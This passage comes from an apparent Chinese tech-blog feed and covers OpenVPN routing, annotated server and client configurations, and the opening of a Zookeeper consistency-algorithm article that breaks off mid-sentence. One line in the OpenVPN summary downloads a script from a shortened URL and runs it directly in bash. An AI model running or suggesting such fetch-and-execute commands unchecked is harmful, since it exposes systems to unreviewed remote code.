class="comment">#ignore-unknown-option block-outside-dns</span></span><br><span class="line"><span class="comment">#block-outside-dns</span></span><br><span class="line">verb 3</span><br><span class="line"><span class="comment"># route-nopull 如果在客户端配置文件中配route-nopull，openvpn 连接后将不会在电脑上添加任何路由，所有流量都将本地转发</span></span><br><span class="line">route-nopull</span><br><span class="line"><span class="comment"># vpn_gateway 如果在客户端配置文件中配vpn_gateway ，默认访问网络不走vpn隧道，如果可以通过添加该参数，下发路由，访问目的网络匹配到会自动进入VPN隧道</span></span><br><span class="line">route 192.168.1.0 255.255.255.0 vpn_gateway</span><br><span class="line">route 192.168.2.0 255.255.255.0 vpn_gateway</span><br></pre></td></tr></table></figure><p><code>net_gateway</code> 这个参数和 <code>vpn_gateway</code> 相反,表示在默认出去的访问全部走<code>openvpn</code> 时,强行指定部分IP地址段访问不通过 <code>openvpn</code> 出去。<code>max-routes</code> 参数表示可以添加路由的条数,默认只允许添加100条路由,如果少于100条路由可不加这个参数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">max-routes 1000</span><br><span class="line">route 192.168.1.0 255.255.255.0 net_gateway</span><br></pre></td></tr></table></figure><h1>三、配置文件详解</h1><h2 id="1、服务端配置文件">1、服务端配置文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#################################################</span></span><br><span class="line"><span class="comment"># 针对多客户端的OpenVPN 2.0 的服务器端配置文件示例</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 本文件用于多客户端&lt;-&gt;单服务器端的OpenVPN服务器端配置</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># OpenVPN也支持单机&lt;-&gt;单机的配置(更多信息请查看网站上的示例页面)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 该配置支持Windows或者Linux/BSD系统。此外，在Windows上，记得将路径加上双引号，</span></span><br><span class="line"><span class="comment"># 并且使用两个反斜杠，例如："C:\\Program Files\\OpenVPN\\config\\foo.key"</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># '#' or ';'开头的均为注释内容</span></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#OpenVPN应该监听本机的哪些IP地址？</span></span><br><span class="line"><span class="comment">#该命令是可选的，如果不设置，则默认监听本机的所有IP地址。</span></span><br><span class="line">;<span class="built_in">local</span> a.b.c.d</span><br><span class="line"></span><br><span class="line"><span class="comment"># OpenVPN应该监听哪个TCP/UDP端口？</span></span><br><span class="line"><span class="comment"># 如果你想在同一台计算机上运行多个OpenVPN实例，你可以使用不同的端口号来区分它们。</span></span><br><span class="line"><span class="comment"># 此外，你需要在防火墙上开放这些端口。</span></span><br><span class="line">port 1194</span><br><span class="line"></span><br><span class="line"><span class="comment">#OpenVPN使用TCP还是UDP协议?</span></span><br><span class="line">;proto tcp</span><br><span class="line">proto udp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定OpenVPN创建的通信隧道类型。</span></span><br><span class="line"><span class="comment"># "dev tun"将会创建一个路由IP隧道，</span></span><br><span class="line"><span class="comment"># "dev tap"将会创建一个以太网隧道。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 如果你是以太网桥接模式，并且提前创建了一个名为"tap0"的与以太网接口进行桥接的虚拟接口，则你可以使用"dev tap0"</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 如果你想控制VPN的访问策略，你必须为TUN/TAP接口创建防火墙规则。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 在非Windows系统中，你可以给出明确的单位编号(unit number)，例如"tun0"。</span></span><br><span class="line"><span class="comment"># 在Windows中，你也可以使用"dev-node"。</span></span><br><span class="line"><span class="comment"># 在多数系统中，除非你部分禁用或者完全禁用了TUN/TAP接口的防火墙，否则VPN将不起作用。</span></span><br><span class="line">;dev tap</span><br><span class="line">dev tun</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果你想配置多个隧道，你需要用到网络连接面板中TAP-Win32适配器的名称(例如"MyTap")。</span></span><br><span class="line"><span class="comment"># 在XP SP2或更高版本的系统中，你可能需要有选择地禁用掉针对TAP适配器的防火墙</span></span><br><span class="line"><span class="comment"># 通常情况下，非Windows系统则不需要该指令。</span></span><br><span class="line">;dev-node MyTap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置SSL/TLS根证书(ca)、证书(cert)和私钥(key)。</span></span><br><span class="line"><span class="comment"># 每个客户端和服务器端都需要它们各自的证书和私钥文件。</span></span><br><span class="line"><span class="comment"># 服务器端和所有的客户端都将使用相同的CA证书文件。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 通过easy-rsa目录下的一系列脚本可以生成所需的证书和私钥。</span></span><br><span class="line"><span class="comment"># 记住，服务器端和每个客户端的证书必须使用唯一的Common Name。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 你也可以使用遵循X509标准的任何密钥管理系统来生成证书和私钥。</span></span><br><span class="line"><span class="comment"># OpenVPN 也支持使用一个PKCS #12格式的密钥文件(详情查看站点手册页面的"pkcs12"指令)</span></span><br><span class="line">ca ca.crt</span><br><span class="line">cert server.crt</span><br><span class="line">key server.key  <span class="comment"># 该文件应该保密</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定迪菲·赫尔曼参数。</span></span><br><span class="line"><span class="comment"># 你可以使用如下名称命令生成你的参数：</span></span><br><span class="line"><span class="comment">#   openssl dhparam -out dh1024.pem 1024</span></span><br><span class="line"><span class="comment"># 如果你使用的是2048位密钥，使用2048替换其中的1024。</span></span><br><span class="line">dh dh1024.pem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置服务器端模式，并提供一个VPN子网，以便于从中为客户端分配IP地址。</span></span><br><span class="line"><span class="comment"># 在此处的示例中，服务器端自身将占用10.8.0.1，其他的将提供客户端使用。</span></span><br><span class="line"><span class="comment"># 如果你使用的是以太网桥接模式，请注释掉该行。更多信息请查看官方手册页面。</span></span><br><span class="line">server 10.8.0.0 255.255.255.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定用于记录客户端和虚拟IP地址的关联关系的文件。</span></span><br><span class="line"><span class="comment"># 当重启OpenVPN时，再次连接的客户端将分配到与上一次分配相同的虚拟IP地址</span></span><br><span class="line">ifconfig-pool-persist ipp.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 该指令仅针对以太网桥接模式。</span></span><br><span class="line"><span class="comment"># 首先，你必须使用操作系统的桥接能力将以太网网卡接口和TAP接口进行桥接。</span></span><br><span class="line"><span class="comment"># 然后，你需要手动设置桥接接口的IP地址、子网掩码；</span></span><br><span class="line"><span class="comment"># 在这里，我们假设为10.8.0.4和255.255.255.0。</span></span><br><span class="line"><span class="comment"># 最后，我们必须指定子网的一个IP范围(例如从10.8.0.50开始，到10.8.0.100结束)，以便于分配给连接的客户端。</span></span><br><span class="line"><span class="comment"># 如果你不是以太网桥接模式，直接注释掉这行指令即可。</span></span><br><span class="line">;server-bridge 10.8.0.4 255.255.255.0 10.8.0.50 10.8.0.100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 该指令仅针对使用DHCP代理的以太网桥接模式，</span></span><br><span class="line"><span class="comment"># 此时客户端将请求服务器端的DHCP服务器，从而获得分配给它的IP地址和DNS服务器地址。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 在此之前，你也需要先将以太网网卡接口和TAP接口进行桥接。</span></span><br><span class="line"><span class="comment"># 注意：该指令仅用于OpenVPN客户端，并且该客户端的TAP适配器需要绑定到一个DHCP客户端上。</span></span><br><span class="line">;server-bridge</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送路由信息到客户端，以允许客户端能够连接到服务器背后的其他私有子网。</span></span><br><span class="line"><span class="comment"># (简而言之，就是允许客户端访问VPN服务器自身所在的其他局域网)</span></span><br><span class="line"><span class="comment"># 记住，这些私有子网也要将OpenVPN客户端的地址池(10.8.0.0/255.255.255.0)反馈回OpenVPN服务器。</span></span><br><span class="line">;push <span class="string">"route 192.168.10.0 255.255.255.0"</span></span><br><span class="line">;push <span class="string">"route 192.168.20.0 255.255.255.0"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 为指定的客户端分配指定的IP地址，或者客户端背后也有一个私有子网想要访问VPN，</span></span><br><span class="line"><span class="comment"># 那么你可以针对该客户端的配置文件使用ccd子目录。</span></span><br><span class="line"><span class="comment"># (简而言之，就是允许客户端所在的局域网成员也能够访问VPN)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 举个例子：假设有个Common Name为"Thelonious"的客户端背后也有一个小型子网想要连接到VPN，该子网为192.168.40.128/255.255.255.248。</span></span><br><span class="line"><span class="comment"># 首先，你需要去掉下面两行指令的注释：</span></span><br><span class="line">;client-config-dir ccd</span><br><span class="line">;route 192.168.40.128 255.255.255.248</span><br><span class="line"><span class="comment"># 然后创建一个文件ccd/Thelonious，该文件的内容为：</span></span><br><span class="line"><span class="comment">#     iroute 192.168.40.128 255.255.255.248</span></span><br><span class="line"><span class="comment">#这样客户端所在的局域网就可以访问VPN了。</span></span><br><span class="line"><span class="comment"># 注意，这个指令只能在你是基于路由、而不是基于桥接的模式下才能生效。</span></span><br><span class="line"><span class="comment"># 比如，你使用了"dev tun"和"server"指令。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 再举个例子：假设你想给Thelonious分配一个固定的IP地址10.9.0.1。</span></span><br><span class="line"><span class="comment"># 首先，你需要去掉下面两行指令的注释：</span></span><br><span class="line">;client-config-dir ccd</span><br><span class="line">;route 10.9.0.0 255.255.255.252</span><br><span class="line"><span class="comment"># 然后在文件ccd/Thelonious中添加如下指令：</span></span><br><span class="line"><span class="comment">#   ifconfig-push 10.9.0.1 10.9.0.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果你想要为不同群组的客户端启用不同的防火墙访问策略，你可以使用如下两种方法：</span></span><br><span class="line"><span class="comment"># (1)运行多个OpenVPN守护进程，每个进程对应一个群组，并为每个进程(群组)启用适当的防火墙规则。</span></span><br><span class="line"><span class="comment"># (2) (进阶)创建一个脚本来动态地修改响应于来自不同客户的防火墙规则。</span></span><br><span class="line"><span class="comment"># 关于learn-address脚本的更多信息请参考官方手册页面。</span></span><br><span class="line">;learn-address ./script</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果启用该指令，所有客户端的默认网关都将重定向到VPN，这将导致诸如web浏览器、DNS查询等所有客户端流量都经过VPN。</span></span><br><span class="line"><span class="comment"># (为确保能正常工作，OpenVPN服务器所在计算机可能需要在TUN/TAP接口与以太网之间使用NAT或桥接技术进行连接)</span></span><br><span class="line">;push <span class="string">"redirect-gateway def1 bypass-dhcp"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 某些具体的Windows网络设置可以被推送到客户端，例如DNS或WINS服务器地址。</span></span><br><span class="line"><span class="comment"># 下列地址来自opendns.com提供的Public DNS 服务器。</span></span><br><span class="line">;push <span class="string">"dhcp-option DNS 208.67.222.222"</span></span><br><span class="line">;push <span class="string">"dhcp-option DNS 208.67.220.220"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 去掉该指令的注释将允许不同的客户端之间相互"可见"(允许客户端之间互相访问)。</span></span><br><span class="line"><span class="comment"># 默认情况下，客户端只能"看见"服务器。为了确保客户端只能看见服务器，你还可以在服务器端的TUN/TAP接口上设置适当的防火墙规则。</span></span><br><span class="line">;client-to-client</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果多个客户端可能使用相同的证书/私钥文件或Common Name进行连接，那么你可以取消该指令的注释。</span></span><br><span class="line"><span class="comment"># 建议该指令仅用于测试目的。对于生产使用环境而言，每个客户端都应该拥有自己的证书和私钥。</span></span><br><span class="line"><span class="comment"># 如果你没有为每个客户端分别生成Common Name唯一的证书/私钥，你可以取消该行的注释(但不推荐这样做)。</span></span><br><span class="line">;duplicate-cn</span><br><span class="line"></span><br><span class="line"><span class="comment"># keepalive指令将导致类似于ping命令的消息被来回发送，以便于服务器端和客户端知道对方何时被关闭。</span></span><br><span class="line"><span class="comment"># 每10秒钟ping一次，如果120秒内都没有收到对方的回复，则表示远程连接已经关闭。</span></span><br><span class="line">keepalive 10 120</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出于SSL/TLS之外更多的安全考虑，创建一个"HMAC 防火墙"可以帮助抵御DoS攻击和UDP端口淹没攻击。</span></span><br><span class="line"><span class="comment"># 你可以使用以下命令来生成：</span></span><br><span class="line"><span class="comment">#   openvpn --genkey --secret ta.key</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 服务器和每个客户端都需要拥有该密钥的一个拷贝。</span></span><br><span class="line"><span class="comment"># 第二个参数在服务器端应该为'0'，在客户端应该为'1'。</span></span><br><span class="line">;tls-auth ta.key 0 <span class="comment"># 该文件应该保密</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择一个密码加密算法。</span></span><br><span class="line"><span class="comment"># 该配置项也必须复制到每个客户端配置文件中。</span></span><br><span class="line">;cipher BF-CBC        <span class="comment"># Blowfish (默认)</span></span><br><span class="line">;cipher AES-128-CBC   <span class="comment"># AES</span></span><br><span class="line">;cipher DES-EDE3-CBC  <span class="comment"># Triple-DES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在VPN连接上启用压缩。</span></span><br><span class="line"><span class="comment"># 如果你在此处启用了该指令，那么也应该在每个客户端配置文件中启用它。</span></span><br><span class="line">comp-lzo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许并发连接的客户端的最大数量</span></span><br><span class="line">;max-clients 100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在完成初始化工作之后，降低OpenVPN守护进程的权限是个不错的主意。</span></span><br><span class="line"><span class="comment"># 该指令仅限于非Windows系统中使用。</span></span><br><span class="line">;user nobody</span><br><span class="line">;group nobody</span><br><span class="line"></span><br><span class="line"><span class="comment"># 持久化选项可以尽量避免访问那些在重启之后由于用户权限降低而无法访问的某些资源。</span></span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出一个简短的状态文件，用于显示当前的连接状态，该文件每分钟都会清空并重写一次。</span></span><br><span class="line">status openvpn-status.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认情况下，日志消息将写入syslog(在Windows系统中，如果以服务方式运行，日志消息将写入OpenVPN安装目录的log文件夹中)。</span></span><br><span class="line"><span class="comment"># 你可以使用log或者log-append来改变这种默认情况。</span></span><br><span class="line"><span class="comment"># "log"方式在每次启动时都会清空之前的日志文件。</span></span><br><span class="line"><span class="comment"># "log-append"这是在之前的日志内容后进行追加。</span></span><br><span class="line"><span class="comment"># 你可以使用两种方式之一(但不要同时使用)。</span></span><br><span class="line">;<span class="built_in">log</span>         openvpn.log</span><br><span class="line">;<span class="built_in">log</span>-append  openvpn.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为日志文件设置适当的冗余级别(0~9)。冗余级别越高，输出的信息越详细。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 0 表示静默运行，只记录致命错误。</span></span><br><span class="line"><span class="comment"># 4 表示合理的常规用法。</span></span><br><span class="line"><span class="comment"># 5 和 6 可以帮助调试连接错误。</span></span><br><span class="line"><span class="comment"># 9 表示极度冗余，输出非常详细的日志信息。</span></span><br><span class="line">verb 3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重复信息的沉默度。</span></span><br><span class="line"><span class="comment"># 相同类别的信息只有前20条会输出到日志文件中。</span></span><br><span class="line">;mute 20</span><br></pre></td></tr></table></figure><h2 id="2、客户端配置文件">2、客户端配置文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">client                  <span class="comment">#指定当前VPN是客户端</span></span><br><span class="line">dev tun                 <span class="comment">#使用tun隧道传输协议</span></span><br><span class="line">proto udp               <span class="comment">#使用udp协议传输数据</span></span><br><span class="line">remote 10.0.0.2 1194   <span class="comment">#openvpn服务器IP地址端口号</span></span><br><span class="line">resolv-retry infinite   <span class="comment">#断线自动重新连接，在网络不稳定的情况下非常有用</span></span><br><span class="line">nobind                  <span class="comment">#不绑定本地特定的端口号</span></span><br><span class="line">ca ca.crt               <span class="comment">#指定CA证书的文件路径</span></span><br><span class="line">cert client.crt         <span class="comment">#指定当前客户端的证书文件路径</span></span><br><span class="line">key client.key          <span class="comment">#指定当前客户端的私钥文件路径</span></span><br><span class="line">verb 3                  <span class="comment">#指定日志文件的记录详细级别，可选0-9，等级越高日志内容越详细</span></span><br><span class="line">persist-key     <span class="comment">#通过keepalive检测超时后，重新启动VPN，不重新读取keys，保留第一次使用的keys</span></span><br><span class="line">persist-tun     <span class="comment">#检测超时后，重新启动VPN，一直保持tun是linkup的。否则网络会先linkdown然后再linkup</span></span><br></pre></td></tr></table></figure><hr><p><a href="https://enjoyms.com/2020/10/28/%E9%85%8D%E7%BD%AEdocker-openvpn%E8%BD%AC%E5%8F%91%E6%8C%87%E5%AE%9A%E7%BD%91%E6%AE%B5%E6%B5%81%E9%87%8F/" target="_blank" rel="noopener" title="https://enjoyms.com/2020/10/28/配置docker-openvpn转发指定网段流量/">https://enjoyms.com/2020/10/28/配置docker-openvpn转发指定网段流量/</a></p><p><a href="https://www.vsay.net/mycode/142.html" target="_blank" rel="noopener" title="https://www.vsay.net/mycode/142.html">https://www.vsay.net/mycode/142.html</a></p><p><a href="http://inat.top/archives/503/" target="_blank" rel="noopener" title="http://inat.top/archives/503/">http://inat.top/archives/503/</a></p><p><a href="https://www.chillifish.cn/3248.html" target="_blank" rel="noopener" title="https://www.chillifish.cn/3248.html">https://www.chillifish.cn/3248.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;OpenVPN 安装与使用&lt;/h1&gt;
&lt;h1&gt;一、一键安装与使用&lt;/h1&gt;
&lt;h2 id=&quot;1、服务端安装使用&quot;&gt;1、服务端安装使用&lt;/h2&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 进入Linux服务器以后，请使用下面的一键安装命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 脚本来源于开源Github:https://github.com/Nyr/openvpn-install&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 可能会下载失败，需要手动或者科学&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;wget https://git.io/vpn -O openvpn-install.sh &amp;amp;&amp;amp; bash openvpn-install.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 安装失败的话，先下载在执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bash openvpn-install.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;##&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 另一个脚本，但是大差不差，可以结合使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# https://github.com/hwdsl2/openvpn-install/blob/master/README-zh.md&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后按照流程选择，注意公网的ip和端口要保证通&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://blog.shawncoding.top/categories/Linux/"/>
    
    
    <category term="网络" scheme="https://blog.shawncoding.top/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>Zookeeper3.5.7源码分析</title>
    <link href="https://blog.shawncoding.top/posts/f1ca6261.html"/>
    <id>https://blog.shawncoding.top/posts/f1ca6261.html</id>
    <published>2024-02-06T07:04:48.000Z</published>
    <updated>2024-02-29T12:07:57.393Z</updated>
    
    <content type="html"><![CDATA[<h1>Zookeeper3.5.7源码分析</h1><h1>一、Zookeeper算法一致性</h1><h2 id="1、Paxos-算法">1、Paxos 算法</h2><h3 id="1-1-概述">1.1 概述</h3><p>Paxos算法：一种基于消息传递且具有高度容错特性的一致性算法。Paxos算法解决的问题：就是如何快速正确的在一个分布式系统中对某个数据值达成一致，并且保证不论发生任何异常，都不会破坏整个系统的一致性。</p><p>在一个Paxos系统中，首先将所有节点划分为Proposer（提议者），Acceptor（接受者），和Learner（学习者）。（注意：每个节点都可以身兼数职），一个完整的Paxos算法流程分为三个阶段：</p><p><strong>Prepare准备阶段</strong></p><ul><li>Proposer向多个Acceptor发出Propose请求Promise（承诺）</li><li>Acceptor针对收到的Propose请求进行Promise（承诺）</li></ul><p><strong>Accept接受阶段</strong></p><ul><li>Proposer收到多数Acceptor承诺的Promise后，向Acceptor发出Propose请求</li><li>Acceptor针对收到的Propose请求进行Accept处理</li></ul><p><strong>Learn学习阶段</strong>：Proposer将形成的决议发送给所有Learners</p><a id="more"></a><h3 id="1-2-算法流程">1.2 算法流程</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291817145.png" alt></p><h3 id="1-3-算法缺陷">1.3 算法缺陷</h3><p>在网络复杂的情况下，一个应用 Paxos 算法的分布式系统，可能很久无法收敛，甚至陷入活锁的情况。造成这种情况的原因是系统中有一个以上的 Proposer，多个Proposers 相互争夺Acceptor，造成迟迟无法达成一致的情况。针对这种情况，一种改进的 Paxos 算法被提出：从系统中选出一个节点作为 Leader，只有 Leader 能够发起提案。这样，一次 Paxos 流程中只有一个Proposer，不会出现活锁的情况</p><h2 id="2、ZAB-协议">2、ZAB 协议</h2><h3 id="2-1-概述">2.1 概述</h3><p>Zab 借鉴了 Paxos 算法，是特别为 Zookeeper 设计的支持崩溃恢复的原子广播协议。基于该协议，Zookeeper 设计为只有一台客户端（Leader）负责处理外部的写事务请求，然后Leader 客户端将数据同步到其他 Follower 节点。即 Zookeeper 只有一个 Leader 可以发起提案</p><h3 id="2-2-Zab-协议内容">2.2 Zab 协议内容</h3><p>Zab 协议包括两种基本的模式：消息广播、崩溃恢复</p><p><img src="http://qnypic.shawncoding.top/blog/202402291817146.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202402291817147.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202402291817148.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202402291817150.png" alt></p><h2 id="3、CAP理论">3、CAP理论</h2><p>CAP理论告诉我们，一个分布式系统不可能同时满足以下三种</p><ul><li><p>一致性（C:Consistency）</p><p>在分布式环境中，一致性是指数据在<strong>多个副本之间是否能够保持数据一致的特性</strong>。在一致性的需求下，当一个系统在数据一致的状态下执行更新操作后，应该保证系统的数据仍然处于一致的状态。</p></li><li><p>可用性（A:Available）</p><p>可用性是指<strong>系统提供的服务必须一直处于可用的状态</strong>，对于用户的每一个操作请求总是能够在有限的时间内返回结果</p></li><li><p>分区容错性（P:Partition 